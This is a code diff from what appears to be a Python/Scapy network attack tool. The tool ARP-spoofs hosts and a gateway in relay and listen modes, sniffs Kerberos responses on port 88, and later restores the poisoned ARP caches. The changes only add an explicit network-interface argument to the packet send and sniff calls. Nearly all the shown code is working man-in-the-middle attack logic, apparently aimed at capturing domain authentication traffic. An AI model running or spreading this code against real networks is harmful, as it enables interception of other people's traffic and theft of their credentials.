@@ -75,7 +75,7 @@ def relaymode_arp_spoof(spoofed_ip):
             packets_list = []
             for target in mac_addresses :
                 packets_list.append(Ether(src = hwsrc, dst=mac_addresses[target]) / ARP(op = 2, hwsrc = hwsrc, psrc = spoofed_ip))
-            sendp(packets_list, verbose=False)
+            sendp(packets_list, iface=iface, verbose=False)
         time.sleep(1)
         timer += 1
         if timer == 3 :
@@ -85,7 +85,7 @@ def relaymode_arp_spoof(spoofed_ip):
 def listenmode_arp_spoof():
     gateway_mac = getmacbyip(gw)
     while not stop_arp_spoofing_flag.is_set() :
-        if Targets != set() : sendp(Ether(src = hwsrc, dst=gateway_mac) / (ARP(op = 2, hwsrc = hwsrc, psrc = list(Targets))), verbose=False)
+        if Targets != set() : sendp(Ether(src = hwsrc, dst=gateway_mac) / (ARP(op = 2, hwsrc = hwsrc, psrc = list(Targets))), iface=iface, verbose=False)
         time.sleep(1)
 
 def valid_ip(address):
@@ -430,7 +430,7 @@ def parse_dc_response(packet):
 
 def listen_mode():
     try :
-        sniff(filter=f"src port 88", prn=parse_dc_response)
+        sniff(filter=f"src port 88", prn=parse_dc_response, iface=iface, store=False)
     except KeyboardInterrupt :
         pass
     except Exception as e :
@@ -457,21 +457,21 @@ def listen_mode():
 
 def restore(poisoned_device, spoofed_ip):
     packet = ARP(op = 2, pdst = poisoned_device, psrc = spoofed_ip, hwsrc = getmacbyip(spoofed_ip)) 
-    send(packet, verbose = False, count=1)
+    send(packet, iface=iface, verbose = False, count=1)
 
 def restore_listenmode(dic_mac_addresses):
     packets_list = []
     gateway_mac = getmacbyip(gw)
     for ip_address in dic_mac_addresses :
         packets_list.append(Ether(dst=gateway_mac) / ARP(op = 2, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]))
-    sendp(packets_list, verbose = False)
+    sendp(packets_list, iface=iface, verbose = False)
 
 def restore_relaymode(dic_mac_addresses):
     packets_list = []
     gateway_mac = getmacbyip(gw)
     for target in dic_mac_addresses :
         packets_list.append(Ether(dst=dic_mac_addresses[target]) / ARP(op = 2, psrc = gw, hwsrc = gateway_mac))
-    sendp(packets_list, verbose = False)
+    sendp(packets_list, iface=iface, verbose = False)
 
 
 def update_uphosts():
